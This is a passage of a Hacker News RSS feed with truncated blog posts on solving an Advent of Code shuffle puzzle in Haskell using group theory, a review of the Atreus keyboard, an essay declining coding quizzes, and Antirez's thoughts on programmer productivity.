November 19, 2020 | https://blog.jle.im/entry/shuffling-things-up.html | <a href="https://web.archive.org/web/*/https://blog.jle.im/entry/shuffling-things-up.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>So it’s November, and <a href="https://adventofcode.com/">Advent of Code</a> season is in the air! It’s time for everyone’s favorite Santa-based light hearted learn-to-program-or-a-new-language holiday season programming challenge series. Every year a bunch of us gather around the fireplace, roast chestnuts, and brainstorm all of the interesting ways we can solve these cute themed puzzles every day. These puzzles are designed to accessible enough for most new programmers, but deep enough to provide entertainment for experienced ones. I’ve <a href="https://blog.jle.im/entries/tagged/advent-of-code.html">written many blog posts</a> on some of the interesting insight some of the puzzles have yielded, and I also <a href="https://github.com/mstksg/advent-of-code-2019/blob/master/reflections.md">post my reflections on as many puzzles I can</a> while solving them in Haskell. And if you’re solving things in Haskell, I also published an <a href="https://hackage.haskell.org/package/advent-of-code-api">open-sourced rate-limited API library</a> so you can fetch and submit answers from the comfort of your command line.</p>
<p>To kick off the season, I’ve decided to write about one of my favorite puzzles from Advent of Code 2019 – <a href="https://adventofcode.com/2019/day/22">Day 22: Slam Shuffle</a>. To me, it stands out because it’s a perfect example of how Haskell’s approach to mathematical abstraction nudges you into the direction of an efficient solution — in a way that other languages would obscure or make less obvious.</p>
<p>So, let’s dive in! In the end, hopefully this post can get you excited for this wonderful season, and maybe also shed some insight into what it means when we say that Haskell can help you leverage math to find good solutions to your real problems.</p>
<p>Of course, this post has spoilers for Advent of Code 2019 Day 22, if you are planning on trying to figure it out from yourself. If you haven’t tried it, I recommend you give it a shot and come back after! :D</p>
<h2 id="slam-shuffle">Slam Shuffle</h2>
<p>If you haven’t already, take some time to <a href="https://adventofcode.com/2019/day/22">read through the problem statement</a>. The basic idea is that we are given a series of operations to “shuffle” a deck of 10007 cards, such as:</p>
<pre><code>deal with increment 7
deal into new stack
deal into new stack
... etc</code></pre>
<p>After performing all of the many operations, the question then asks about the card at a given position (the 2019th card in the deck).</p>
<p>Part 2, which you might not be able to see if you haven’t submitted an answer yet for Part 1, involves the same process with a deck of 119315717514047 cards, and repeating the entire shuffling sequence 101741582076661 times. It then asks you to find the card that ends up at index 2020.</p>
<p>In this problem, it seems we have a list of “shuffles” that we want to run on a deck of cards. However, let’s think about this in a more data-driven approach: instead of thinking about successive shufflings of cards, let’s imagine the specification of a “shuffle” itself as our main data, and how we can combine shuffle operations together into new shuffle operations.</p>
<p>We are looking for “take shuffle A and shuffle B, and return a new shuffle that represents doing B, then A”. This is “shuffle composition”, or “permutation composition” (<a href="https://en.wikipedia.org/wiki/Permutation">permutation</a> being the mathematical word for “shuffling” here, basically)</p>
<p>Since we’ve identified that we want to begin implementing a way of composing/combining permutations together, we can do a bit of reading to learn that one of the most famous properties of permutation composition is that they form a “group”, which means they can be composed (associatively), have an identity, and can be inverted. This means that if you have two permutations, you can “squish” them to create a new permutation, and work with that <em>new</em> permutation.</p>
<p>I’ve talked about <a href="https://blog.jle.im/entry/alchemical-groups.html">using group theory</a> principles before in this blog to help guide us towards solutions and optimizations — the main principle is that if we express our program in terms of group operations, then we can take advantage of the large body of knowledge built up over centuries to understand, analyze, and potentially optimize our program.</p>
<p>The <em>first</em> big advantage in this situation is that we can treat our transformations <em>as data</em>, and not as functions. And that if we have two transformations, we can always create a new one (just a normal data type value) that represents the composition of the two original ones.</p>
<h2 id="now-youre-thinking-with-groups">Now You’re Thinking With Groups</h2>
<p>Knowing permutations are a group, it means that once we settle on our representation of them, <code>Perm</code>, we can write an instance of <code>Perm</code> for <code>Semigroup</code>, <code>Monoid</code>, and <code>Group</code>, abstractions in Haskell that many types are already instances of. Abstractions like <code>Semigroup</code> and <code>Monoid</code> are pretty much an everyday thing in Haskell, so this fits in quite nicely. <code>Group</code> comes from the <em><a href="https://hackage.haskell.org/package/groups">groups</a></em> package, which also provides some nice applications of group theory.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>...</span> <span>-- let's figure out the implementation later, where n is the number of cards</span></span></code></pre></div>
<p>In Haskell, we express things like “<code>Perm</code> is a Semigroup/Monoid/Group” by saying that they are instances of <em>typeclasses</em>, which (for this purpose) are like interfaces in languages like Java.</p>
<div id="cb3"><pre><code><span id="cb3-1"><a href="#cb3-1"></a><span>-- | An instance m can be "combined" using `x &lt;&gt; y`</span></span>
<span id="cb3-2"><a href="#cb3-2"></a><span>class</span> <span>Semigroup</span> m <span>where</span></span>
<span id="cb3-3"><a href="#cb3-3"></a><span>    (&lt;&gt;) ::</span> m <span>-&gt;</span> m <span>-&gt;</span> m</span>
<span id="cb3-4"><a href="#cb3-4"></a></span>
<span id="cb3-5"><a href="#cb3-5"></a><span>-- | There is always an identity element for &lt;&gt;:</span></span>
<span id="cb3-6"><a href="#cb3-6"></a><span>--</span></span>
<span id="cb3-7"><a href="#cb3-7"></a><span>-- x &lt;&gt; mempty == x</span></span>
<span id="cb3-8"><a href="#cb3-8"></a><span>-- mempty &lt;&gt; x == x</span></span>
<span id="cb3-9"><a href="#cb3-9"></a><span>--</span></span>
<span id="cb3-10"><a href="#cb3-10"></a><span>class</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Monoid</span> m <span>where</span></span>
<span id="cb3-11"><a href="#cb3-11"></a><span>    mempty ::</span> m</span>
<span id="cb3-12"><a href="#cb3-12"></a></span>
<span id="cb3-13"><a href="#cb3-13"></a><span>-- | Every m has an inverse:</span></span>
<span id="cb3-14"><a href="#cb3-14"></a><span>--</span></span>
<span id="cb3-15"><a href="#cb3-15"></a><span>-- x &lt;&gt; invert x == mempty</span></span>
<span id="cb3-16"><a href="#cb3-16"></a><span>-- invert x &lt;&gt; x == mempty</span></span>
<span id="cb3-17"><a href="#cb3-17"></a><span>--</span></span>
<span id="cb3-18"><a href="#cb3-18"></a><span>class</span> <span>Monoid</span> m <span>=&gt;</span> <span>Group</span> m <span>where</span></span>
<span id="cb3-19"><a href="#cb3-19"></a><span>    invert ::</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>This means that if <code>Perm</code> is an instance of <code>Group</code> (which has superclasses <code>Semigroup</code> and <code>Monoid</code>), we can:</p>
<ul>
<li>Compose permutations using <code>x &lt;&gt; y</code>, which means “shuffle with strategy <code>y</code>, then with strategy <code>x</code>”</li>
<li>Summon an “identity permutation” where <code>x &lt;&gt; mempty == x</code> (the identity permutation, which is “leave things alone”).</li>
<li>Invert any shuffling (if we have <code>x</code>, we can reverse its effect with <code>invert x</code>)</li>
</ul>
<p>In addition, the standard libraries also give us a useful function <code>stimes</code></p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>stimes ::</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Int</span> <span>-&gt;</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>which lets us compose <code>x</code> with itself (<code>stimes 5 x == x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code>), but can do it in <em>log(n)</em> time using <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. It’s extremely efficient in a lot of circumstances (more on that later) — more so than the naive compose-it-n-times implementation. This will definitely become useful in part 2, where we have to do 101741582076661 compositions.</p>
<h2 id="our-gameplan">Our Gameplan</h2>
<p>Just <em>knowing</em> that permutations form a group naturally guides us to these abstractions — we already know what <em>interface</em> our type will have, even before we write any code. We know that no matter <em>what</em> our implementation of permutation will be, we will have <code>(&lt;&gt;)</code>, <code>stimes</code>, <code>mempty</code>, <code>invert</code> available to us to use. So, let’s do just that! We’ll use a stub data type <code>Perm</code> to represent our permutation and “pretend” we have that interface on it. We’ll write our functions first and then fill in the interface later!</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>-- | Represents a permutation of n cards</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>....</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a><span>-- | Given a permutation, find the place where a given index ends up.</span></span>
<span id="cb5-5"><a href="#cb5-5"></a><span>runPerm ::</span> <span>Perm</span> n <span>-&gt;</span> <span>Finite</span> n <span>-&gt;</span> <span>Finite</span> n</span>
<span id="cb5-6"><a href="#cb5-6"></a></span>
<span id="cb5-7"><a href="#cb5-7"></a><span>-- | Parse a string line into the permutation it represents</span></span>
<span id="cb5-8"><a href="#cb5-8"></a><span>parsePerm ::</span> <span>String</span> <span>-&gt;</span> <span>Perm</span> n</span>
<span id="cb5-9"><a href="#cb5-9"></a></span>
<span id="cb5-10"><a href="#cb5-10"></a><span>-- | Given a permutation list, find the place where 2019 ends up</span></span>
<span id="cb5-11"><a href="#cb5-11"></a><span>part1 ::</span> [<span>Perm</span> <span>10007</span>] <span>-&gt;</span> <span>Finite</span> <span>10007</span></span>
<span id="cb5-12"><a href="#cb5-12"></a>part1 perms <span>=</span> runPerm bigPerm <span>2019</span></span>
<span id="cb5-13"><a href="#cb5-13"></a>  <span>where</span></span>
<span id="cb5-14"><a href="#cb5-14"></a>    bigPerm <span>=</span> <span>mconcat</span> perms</span></code></pre></div>
<p>(<code>mconcat perms</code> composes all of the permutations one after another: <code>mconcat [x,y,z] = x &lt;&gt; y &lt;&gt; z</code>)</p>
<p>And…that’s it! For the actual “logic” of our part 1! All we need to do is implement <code>runPerm</code> and <code>parsePerm</code>.</p>
<p>Here, I’m using <code>Finite n</code> from the great <em><a href="https://hackage.haskell.org/package/finite-typelits">finite-typelits</a></em> library, where <code>Finite 100</code> represents “an index between 0 and 99”, etc. It’s just exactly the right “shape” to represent the index of a deck of cards. <em>finite-typelits</em> wasn’t designed with group theory in mind, but it’s still a great tool here — which is a testament to how flexible these abstractions can actually be :)</p>
<p>For example, it means that for a <code>Perm 10007</code> (a permutation of 10007 cards), the type of <code>runPerm</code> is <code>Perm 10007 -&gt; Finite 10007 -&gt; Finite 10007</code>, and the type of <code>parsePerm</code> is <code>String -&gt; Perm 10007</code>.</p>
<p>We can plan out our part 2 as well:</p>
<div id="cb6"><pre><code><span id="cb6-1"><a href="#cb6-1"></a><span>-- | Given a permutation list, find the index that will end up at 2020</span></span>
<span id="cb6-2"><a href="#cb6-2"></a><span>part2 ::</span> [<span>Perm</span> <span>119315717514047</span>] <span>-&gt;</span> <span>Finite</span> <span>119315717514047</span></span>
<span id="cb6-3"><a href="#cb6-3"></a>part2 perms <span>=</span> runPerm (invert biiigPerm) <span>2020</span></span>
<span id="cb6-4"><a href="#cb6-4"></a>  <span>where</span></span>
<span id="cb6-5"><a href="#cb6-5"></a>    bigPerm   <span>=</span> <span>mconcat</span> perms</span>
<span id="cb6-6"><a href="#cb6-6"></a>    biiigPerm <span>=</span> stimes <span>101741582076661</span> bigPerm</span></code></pre></div>
<p>Part 2, I think, is where the group theory really shines.</p>
<ol type="1">
<li><p>We take advantage of <code>stimes</code>, which uses <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. That means that to compute <code>stimes 8 x</code>, instead of using</p>
<pre><code>x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code></pre>
<p>it does</p>
<pre><code>let x2 = x &lt;&gt; x
    x4 = x2 &lt;&gt; x2
in  x4 &lt;&gt; x4</code></pre>
<p>essentially cutting down the number of multiplications exponentially. This means that to compute <code>stimes 101741582076661</code>, we only need to do about 47 multiplications (log base 2), and not 101741582076661.</p>
<p>This is only possible because we know that permutation composition is associative, so it doesn’t matter how we associate our parentheses. It is only “safe” to use repeated squaring if you <em>know</em> that your operation is associative. Having a semigroup abstraction <em>in the first place</em> guides us to this efficient solution — in a way that is pre-built just for us! This is made all the more powerful because <em>semigroup</em> is a ubiquitous abstraction in Haskell, so we “think about” it all the time.</p></li>
<li><p>Remember how <code>runPerm p 2019</code> gives us the index that <code>2019</code> is sent to? Well, we want something else in this case. We basically want the index that <em>will be sent to</em> <code>2020</code>. So, we want to <em>reverse the function</em>. Luckily, since our function is just a permutation, it is easy to reverse this: just <code>invert</code> the permutation!</p>
<p>The idea that we can simply invert a permutation instead of having to write a whole new permutation representation just to do “backwards indexing” is something that we are <em>guided to</em>, just by recognizing that permutations form a group.</p></li>
</ol>
<h2 id="a-first-guess-at-implementation">A first guess at implementation</h2>
<p>Now, time to do what we have been putting off and actually write our permutation representation – the definition of <code>Perm n</code>. A good <em>first guess</em> might be to write our permutation as an actual function — a function from index to index, <code>Finite n -&gt; Finite n</code>. Then, we can just use function composition as our permutation composition.</p>
<div id="cb9"><pre><code><span id="cb9-1"><a href="#cb9-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>Perm</span> (<span>Finite</span> n <span>-&gt;</span> <span>Finit…</span></span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jle.im/entry/shuffling-things-up.html">https://blog.jle.im/entry/shuffling-things-up.html</a></em></p>]]>
            </description>
            <link>https://blog.jle.im/entry/shuffling-things-up.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151050</guid>
            <pubDate>Thu, 19 Nov 2020 16:25:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Source Keyboardio Atreus Keyboard – Six Week Review]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150868">thread link</a>) | @codesections
<br/>
November 19, 2020 | https://www.codesections.com/blog/atreus-review/ | <a href="https://web.archive.org/web/*/https://www.codesections.com/blog/atreus-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
    

  <h2>Open Source Keyboardio Atreus Keyboard – Six Week Review</h2>
  <p>As I write this, I've now had my Keyboardio Atreus for a full six weeks and have been
using it pretty much exclusively that whole time.  After a month and a half, I've given it
a fair shake and can give you my full impressions.  And my full impression is that it is
<strong>amazing</strong>.</p>

<h2 id="atreus-background">Atreus background</h2>
<p>Before I tell you what I love about it, what <em>is</em> the Atreus?  Well, it's a keyboard. It's
a <em>tiny</em> keyboard.</p>
<p>More specifically, it's a keyboard with 44 keys – compared with 84 on my ThinkPad
keyboard, and a full 108 on a traditional desktop keyboard.  How does it get by with so
few keys?  More on that in a minute; for now, just focus on how small the thing is,
without needing to cramp any of the individual keys in the least.</p>
<p><img src="https://www.codesections.com/blog/atreus-review/atreus.jpeg" alt="The Atreus keyboard on top of a ThinkPad"></p>
<span id="continue-reading"></span>
<p>Just from that photo, you might notice a few other features of the Atreus.  First – and
unlike nearly every other keyboard in existence – its keys are arranged into columns
rather than rows: the <code>D</code> is exactly even with the <code>E</code> key above it, but isn't vertically
aligned with the <code>F</code> key to its right.  Both of these changes make the Atreus <em>far</em> more
ergonomic to use.  Aligning the keys horizontally means that your fingers don't need move
diagonally nearly as often (a big contributor to RSI).  And moving the keys out of
horizontal rows aligns them more comfortably with the lengths of your fingers.  This
ortholinear layout is designed to make the Atreus significantly more comfortable and, more
importantly, to reduce the strain inherent in typing.</p>
<p>The other feature you likely noticed from the image is that my Atreus doesn't have any
letters on the keys.  That's not a requirement – they also offer the Atreus with keycaps
made out of "bright white PBT, which is dye-sublimated black and then laser-ablated to
reveal bright white legends".  As fancy as that sounds, I opted for the blank keycaps
because it helps with the Atreus's <em>other</em> superpower.</p>
<p>Aside from its compact and ergonomic form factor, the Atreus's standout feature is its
full and easy customization.  You can set exactly what you want to happen on every key
press, whether that's sending a single key or executing a complex series of commands.  And
all of this happens at the firmware level on the keyboard – which means it Just Works™ on
any computer you might plug the Atreus into, without any software.</p>

<p>The Atreus actually offers two ways to customize the keys: A GUI configuration tool called
Chrysalis (shown below) and text-based configuration via Kaleidoscope. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/chrysalis.png" alt="Chrysalis screenshot with default QWERTY layout"></p>
<p>And all of this is powered by fully open source code.  The Atreus <a href="https://atreus.technomancy.us/">began
life</a> as a DIY project by the noted Free Software hacker
and language designer Phil Hagelberg (aka <a href="https://atreus.technomancy.us/">technomancy</a>),
and is now manufactured by Keyboardio; between the two of them, they've maintained an
admirable commitment to building the Atreus on free software.</p>
<p>So, now you know what the Atreus is: it's tiny, it's customizable, and it's fully powered
by free software.  But what's it like to actually <em>use</em> the thing?</p>
<h2 id="how-does-it-all-fit">How does it all fit?</h2>
<p>Let's talk about the point I put off above: just how do you use a keyboard that
only has 44 keys?  Even if we're only typing English ASCII text, we need to be able to
type 26 letters, 10 numerals, and 30 special characters.  Simple arithmetic is enough to
show that those 66 letters won't fit into 44 keys in a straightforward way – and that's
without considering non-printing characters or modifiers.</p>
<p>But it's actually modifiers that make the Atreus possible.  A typical keyboard has four
(or more) modifiers: Ctrl, Alt, Left Shift, and Right Shift.  Many keyboards will have
more than one Ctrl key, but they'll <em>all</em> have two Shift keys.  Why?  Well, as anyone who
has ever learned to touch type can tell you, there are two Shift keys so that you can hold
one with your right pinky when you type keys on the left side of the keyboard and can
hold the other with your left pinky whenever you type keys on the right side of the
keyboard.  If we only had one shift key to hit with our pinky, we'd have to contort our
hand mightily to enter capital letters on that side of the keyboard.</p>
<p>But we're only in that bind because we're forced to use our pinkies to hit the Shift
keys.  The Atreus moves that duty away from our weakest finger and to our strongest finger
– a finger that, incidentally, is ridiculously underused in a traditional keyboard
layout.  With the Atreus, you press the Shift key with your left thumb.  That means you
can press shift without moving your fingers out of position on the home row; moreover, in
combination with the Atreus's smaller number of keys, it means you can comfortably hold
the left shift key while pressing any other key on the keyboard.</p>
<p>That may not sound like a huge win – if all it does for us is get rid of the right Shift
key, then it just saves the Atreus a single key.  However, because the Atreus is
symmetrical, everything we just said about the left Shift key is equally true of the right
Shift key: you can also hold it while comfortably pressing every key on the keyboard.
Except we just said that we don't need a right Shift key.</p>
<p>Or, at least, we don't need a right Shift key that shifts us into typing capital letters.
Instead, we can use the right "Shift" key to shift us into a different set of characters
altogether.  This might sound a bit odd (and I acknowledge that it takes some getting used
to) but it's not really that different from how the Shift key works on a normal keyboard.
On a normal keyboard, you enter the <code>?</code> character by pressing <code>Shift</code> and <code>/</code> at the same
time; that's not because a question mark is somehow a "capital slash" (which, anyway,
sounds more like something a corporate raider would do than an item of punctuation).
Shifting into the other set of characters – the Atreus calls them Layer 2 – works just
like that, but for everything. </p>
<p><img src="https://www.codesections.com/blog/atreus-review/layer.png" alt="Layer 2 keys with default bindings"></p>
<p>That gives us up to an extra 43 effective keys to play with (since we're holding one key
down, we can't assign a new value to it), which would put us at 87 keys – already more
than my ThinkPad keyboard.  In practice, however, you probably don't want to assign a
different character for <em>every</em> key; the default bindings leave 8 with their Layer 1
meanings, which leaves us with just 79 effective keys.  So we're still short of a laptop
keyboard, to say nothing of a traditional desktop one.</p>
<p>Talking about Layer 1 and Layer 2 has probably made the solution to this obvious: add a
Layer 3!  And that's exactly what the default bindings do, adding another 25 keys, which
brings us up to 104 effective keys and parity with a full desktop keyboard.</p>
<p>But how do we access Layer 3?  We could dedicate another thumb key to it (which is what I
do in my personal configuration), but the default bindings go a different direction:
instead of accessing the layer by holding a key, you toggle into it by pressing a key
(i.e., instead of being like Shift, it's like CapsLock).</p>
<h2 id="ok-but-why">Ok, but why?!</h2>
<p>At this point, you probably get the <em>how</em> behind the Atreus's method for fitting 100+ keys
worth of functionality into just 44 keys.  But I wouldn't blame you if you're fuzzy on the
<em>why</em>.  Why go through all that trouble (and the learning curve of at least slightly
retraining your fingers) just to get back to the same number of keys that we started with?</p>
<p>Well, for some people, part of the appeal might be portability; Keyboardio even offers a
<a href="https://shop.keyboard.io/products/keyboardio-atreus-travel-case">travel case</a>.  It could
be the perfect keyboard to take with you when you work from a coffee shop, co-working
space, or other crowded public space!</p>

<p>The Atreus really was first designed as an ergonomic keyboard that <a href="https://technomancy.us/172">you can take to local
coffee shops</a>.  But, even when coffee-shop-working was an
option, I was never interested in the Atreus for that sort of portability.  I like the
idea of a small keyboard for three reasons: ergonomics, consistency, and speed.</p>
<h3 id="ergonomics">Ergonomics</h3>
<p>A big part of the reason I started looking at switching to a non-laptop keyboard is that
I'd started to experience a bit of discomfort after long stretches of coding.  Nothing
bad; nothing I'd even call pain.  But something noticeable, and I'm inclined to take even
a <em>hint</em> of Repetitive Strain Injury very seriously – especially given how many <a href="http://ergoemacs.org/emacs/emacs_hand_pain_celebrity.html">
programmers</a> have <a href="https://medium.com/@mdlayher/a-programmers-journey-with-rsi-c73628eed0c4">dealt with
RSI</a>.  And,
while there's a lot of disagreement about RSI, nearly everyone agrees that prevention is
far, far easier than cure.</p>
<p>If you take a look at <a href="http://xahlee.info/kbd/ergonomic_keyboards.html">lists</a> of <a href="https://www.nytimes.com/wirecutter/reviews/comfortable-ergo-keyboard/">best
ergonomic
keyboards</a>, you
probably won't see the Atreus. Partly, that's because it's new, and a bit less mainstream;
it might not be on everyone's radar.  But even accounting for that, the Atreus is missing
at least a few features that the most ergonomic keyboard have – though it does have most
of them.  Here, have a chart comparing the Atreus, the
<a href="https://ergodox-ez.com/">Ergodox-EZ</a>, and the
<a href="https://github.com/adereth/dactyl-keyboard">Dactyl</a>.</p>
<table><thead><tr><th>Feature</th><th>Ergodox</th><th>Dactyl</th><th>Atreus</th></tr></thead><tbody>
<tr><td>Mechanical keys</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Split section for hands</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Ortholinear layout</td><td>✓</td><td>✓</td><td>✓</td></tr>
<tr><td>Fully split halves</td><td>✓</td><td>✓</td><td>✗</td></tr>
<tr><td>Elevated middle ("tenting")</td><td>✓</td><td>✓</td><td>✗</td></tr>
<tr><td>Concave keys</td><td>✗</td><td>✓</td><td>✗</td></tr>
</tbody></table>
<p>So, given the Atreus's strong but definitely trailing showing on those traditional
ergonomic factors, why am I still enthusiastic about the Atreus as an ergonomic keyboard?</p>
<p>Well, it comes down to what each finger is being asked to do – or, put differently, it
comes right back to how tiny the Atreus is.  If you look at the <a href="https://ergodox-ez.com/pages/getting-started">default layout of the
Ergodox-EZ</a>, you'll see that each pinky
is responsible for <strong>ten</strong> keys, many of which involve the more-ergonomically harmful
diagonal movement.  Two keys (in the default layout, <code>=</code> and <code>-</code>) require stretching your
pinky two keys up and one to the side – at least for me, that'd be quite the stretch.  In
contrast, the Atreus asks your pinky to be responsible for only four keys, none of which
involve diagonal movement, and only one of which is more than one key away.</p>
<p>I know I'm harping on the pinkies a bit but, well, there's a reason some people call RSI
<a href="https://skeptics.stackexchange.com/questions/17492/does-emacs-cause-emacs-pinky">Emacs
Pinky</a>.
The pinky is, obviously, one of the weakest fingers, and asking it to do a lot is a fast
way to overtax your hands.  And some of those big stretches can be even more …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.codesections.com/blog/atreus-review/">https://www.codesections.com/blog/atreus-review/</a></em></p>]]>
            </description>
            <link>https://www.codesections.com/blog/atreus-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150868</guid>
            <pubDate>Thu, 19 Nov 2020 16:08:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sorry, I won’t take your online coding quiz]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25150836">thread link</a>) | @Ahmedb
<br/>
November 19, 2020 | https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz | <a href="https://web.archive.org/web/*/https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<section>
				

				

				
					<article>
						
							
								<a href="https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz"></a>
							
							
							<p>With nearly a decade of making apps professionally, I’ve been through all the ways recruiters use to evaluate candidates: Coding quizzes, peer programming sessions, writing tests, writing documentation, feature scoping, code audit, etc.</p><p>I have also been on the other side of the table a few times to evaluate new hires, so I understand the end game: Recruiters get lots of applications and they cannot afford to interview each one of the good ones. <br></p><p>As such the situation below was born:<br></p><blockquote><p><b>Companies are looking for a way to create a funnel, to <b>automatically</b> filter out&nbsp; the “bad” fits. <br></b></p><p><b>And the simple way to do that came from academia i.e Grades.</b></p></blockquote><p>So Codility, Hacker Rank, Dev Skiller and co. were born out of this need.</p><p> But they focused so much on the end goal (<b>saving the company time by only allowing a few</b>) that they forgot about the actual evaluation. Programming tests are a good fit for people who are good at preparing for them. The college graduates or the people who have enough free time to practice weekly on those platforms.<br></p><p>I don’t have the time to rehearse 
(or reverse) binary trees and take your test and ship a home assignment and do a technical interview. Specially since the real job doesn’t include re implementing a sorting algorithms.<br></p><p><b><i>I have no issues with assignments and take home projects</i></b> because although I
 have <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fgithub.com%2Fahbou%2F&amp;t=YjRkZjc0YTJjNTU2NmRmYjEwZTVhM2Y1MGU5ZjdiYzJmM2IwMTgyZSxFUFZ0MldZaA%3D%3D&amp;b=t%3ApNqn9Es7-Uwh3xaGTNcJRQ&amp;p=https%3A%2F%2Fahbou.org%2Fpost%2F635229336295899136%2Fsorry-i-wont-take-your-online-coding-quiz&amp;m=1&amp;ts=1605990068" target="_blank">code available publicly </a>it might not be recent enough. So a small project is a good way to evaluate a candidate’s thinking, architectural choices and coding style if the said project is either paid or takes a couple of hours to finish.<br></p><p>Anyway, I’ve decided I will not take any programming tests anymore.<br></p>
							
							
							
						

						

						

						

						

						

						

						

						

						
							
						
					</article> <!-- /post -->			
				
  				

				
				
				
							
			</section> <!-- /posts -->
		</div></div>]]>
            </description>
            <link>https://ahbou.org/post/635229336295899136/sorry-i-wont-take-your-online-coding-quiz</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150836</guid>
            <pubDate>Thu, 19 Nov 2020 16:05:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The mythical 10x programmer by Antirez]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25150827">thread link</a>) | @pietroppeter
<br/>
November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
